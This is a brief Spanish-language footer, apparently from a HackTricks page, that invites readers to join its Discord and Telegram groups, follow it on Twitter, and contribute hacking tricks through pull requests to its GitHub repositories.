* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
